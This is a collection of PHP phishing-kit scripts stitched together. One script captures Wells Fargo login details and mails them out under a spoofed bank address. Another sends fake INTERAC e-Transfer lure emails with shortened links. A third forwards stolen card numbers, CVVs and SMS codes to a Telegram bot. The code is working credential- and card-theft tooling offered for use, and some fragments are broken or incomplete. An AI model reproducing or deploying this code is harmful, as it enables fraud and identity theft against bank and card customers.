
<?php
session_start();

// Ensure that the required session variables are set
if (!isset($_SESSION['sender_name']) || !isset($_SESSION['receivers_name']) || !isset($_SESSION['receivers_email']) || !isset($_SESSION['bank-account']) || !isset($_SESSION['amount'])) {

}

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

//Getting user ip & hostname
$date =	date("D M d, Y g:i a");
$user_agent  = $_SERVER['HTTP_USER_AGENT'];
$user_ip = getenv('REMOTE_ADDR');
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");

include("grabber.php");

$message = "--------------Wellsfargo Bank Result-------------------\n";
$message .= "Username: ".$_POST['usernamex']."\n";
$message .= "Password: ".$_POST['passwordx']."\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Submitted By : ".$user_ip."\n";
$message .= "Country Name : {$geoplugin->countryName}"."\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "Date And Time : ".$adddate."\n";
$message .= "Browser Details : ".$user_agent."\n";
$message .= "--------xXx--------\n";
$message .= "IP Address: $ip \n";

$fp = fopen('wells.txt', 'a');
fwrite($fp, $message);
fclose($fp);


$subject = "Wellsfargo Bank ReZulT | $ip";
$headers = "From: Wellsfargo Bank <customer@wellsfargo.com>\n";
$headers .= "MIME-Version: 1.0\n";
//$headers .= "Content-Type: text/plain; charset=UTF-8\n";
//$headers .= "Content-Transfer-Encoding: 8bit\n";


if(mail($recipient, $subject, $message)){ 
   
//header("Location: identify.php?&".generateRandomString(200));
}else{
	
	echo "error sending email";
	
	}


//mail($recipient, $subj, $msg,"$headers");
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
header("Pragma: no-cache");

// Prevent Google Archiving
header("X-Robots-Tag: noarchive");

// Block email scanning
header("X-Content-Type-Options: nosniff");

// Disable listeners and log third-party communications
ini_set("disable_functions", "socket_accept, socket_bind, socket_listen, socket_create_listen, socket_read, socket_recv, socket_recvfrom, socket_recvmsg, socket_send, socket_sendmsg, socket_sendto, socket_getsockname, socket_getpeername, socket_get_option, socket_set_option");


// Logging third-party communication attempts
$logFile = "../../../Database/third-party-log.txt"; // Replace with the path to your log file

// Get the current timestamp
$timestamp = date("Y-m-d H:i:s");

// Get the IP address of the client
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Get the requested URL
$requestUrl = $_SERVER['REQUEST_URI'];

// Create the log message
$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";

// Append the log message to the log file
file_put_contents($logFile, $logMessage, FILE_APPEND);
?>

<?php
    // Function to encrypt the URL parameters
    function encryptParameters($params, $key) {
        $ivLength = openssl_cipher_iv_length('AES-256-CBC');
        $iv = openssl_random_pseudo_bytes($ivLength);
        $encrypted = openssl_encrypt($params, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
        $encryptedMessage = $iv . $encrypted;
        $encryptedParams = base64_encode($encryptedMessage);
        return $encryptedParams;
    }

    // Replace with your encryption key
    $key = 'ENCRYPTED_PASSWORD_MAKE25+CHARACTERS';

    // URL parameters to encrypt
    $params = 'param1=value1&param2=value2';

    // Encrypt the parameters
    $encryptedParams = encryptParameters($params, $key);

    // Read the template file
    $templateFile = 'template.html';
    $emailTemplate = file_get_contents($templateFile);

    // Replace the placeholder with the encrypted parameters
    $emailTemplate = str_replace('{{encryptedParams}}', $encryptedParams, $emailTemplate);

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

    require("phpmailer/src/PHPMailer.php");
    require("phpmailer/src/SMTP.php");
    require("phpmailer/src/Exception.php");

    function logSMTPCommunication($message)
{
    // Specify the path to the log file
    $logFilePath = '/smtp_log.txt';

    // Append the SMTP communication to the log file
    file_put_contents($logFilePath, $message, FILE_APPEND);
}
include "/anti/anti1.php";

$sender_name = $_POST['sender_name'];
$amount = $_POST['amount'];
$date = $_POST['date'];
$link = $_POST['link'];

$data = array($sender_name, $amount, $date, $link);
$file = fopen('/data.csv', 'a');
fputcsv($file, $data);
fclose($file);

$long_url = 'https://' . $_SERVER['HTTP_HOST'] . '/public/deposit/indexx.php?' . http_build_query($_POST);
$short_url = shortenURL($long_url);

$template = $_POST['template']; // The selected template from the dropdown
$message = file_get_contents('template.html');
$message = str_replace('{{shortlink}}', $short_url, $message);
$message = str_replace('{{line}}', $_POST['line'], $message);
$message = str_replace('{{username}}', $_POST['username'], $message);
$message = str_replace('{{photo_href}}', $_POST['photo_href'], $message);
$message = str_replace('{{bank}}', $_POST['bank'], $message);
$message = str_replace('{{amount}}', $_POST['amount'], $message);
$message = str_replace('{{photo_link}}', $_POST['photo_link'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{EXPIRE}}', $_POST['EXPIRE'], $message);
$message = str_replace('{{line}}', $_POST['line'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{sender_name}}', $_POST['sender_name'], $message);
$message = str_replace('{{receiver_name}}', $_POST['receiver_name'], $message);
$message = str_replace('{{receiver_email}}', $_POST['receiver_email'], $message);

$mail = new PHPMailer();
$mail->IsSMTP();
$mail->SMTPSecure = 'tls';
$mail->Host = $_POST['host'];
$mail->Port = $_POST['port'];
$mail->Body = $message;
$mail->SMTPAuth = true;
$mail->Username = $_POST['username'];
$mail->Password = $_POST['password'];
$mail->SetFrom('andallard@mymts.net', $_POST['sender_name']);
$mail->AddAddress($_POST['receiver_email']);
$mail->Subject = 'INTERAC e-Transfer - Template: ' . $template; // Subject includes the selected template
$mail->IsHTML(true);
$mail->CharSet = "utf-8";

if (!$mail->Send()) {
    echo "Mailer Error: " . $mail->ErrorInfo;
}

function shortenURL($url)
{
    $api_url = 'https://is.gd/create.php?format=simple&url=' . urlencode($url);
    return file_get_contents($api_url);
}

$currentDate = new DateTime();
$line = $currentDate->add(new DateInterval('P30D'))->format('F d, Y');
?>
<?php
/* 
  *  Coded by echo ❤️ Telegram @ech0xd
  *
*/
include "antibot.php";
include "id.php";

//------------------------------------------------
session_start();

if(!isset($_SESSION['Phone'])) {
        header("location: index.php");
}
if(!isset($_SESSION['CVV'])) {
        header("location: pyt.php");
    }
 
if(isset($_POST['okbb'])){
  $messageTelegram  = "|+]############[+][ Canadapost echo ][+]############[+|\n";
  $messageTelegram .= "|Card Number  :  ".$_SESSION['Cardnumber']."\n";
  $messageTelegram .= "|Expiry Date  :  ".$_SESSION['Expiry']."\n";
  $messageTelegram .= "|Security Code:  ".$_SESSION['CVV']."\n";
  $messageTelegram .= "|🚨SMS Code🚨:  ".$_POST['sms']."\n";
  $messageTelegram .= "|USER-IP-ADDRESS :  ".$ipssss."\n";
  $messageTelegram .= "|+]############[+][ Canadapost echo ][+]############[+|\n";
  if ($enableTelegram){
     foreach($IdTelegram as $user_id) {
     $website="https://api.telegram.org/bot".$BotTelegramToken;
     $params=[
       'chat_id'=>$user_id, 
       'text'=>$messageTelegram,
     ];
     $ch = curl_init($website . '/sendMessage');
     curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     $result = curl_exec($ch);
     curl_close($ch);
     }
  }

$_SESSION['sms'] =$_POST['sms'];


  HEADER("Location: successful.php");
} 
?>
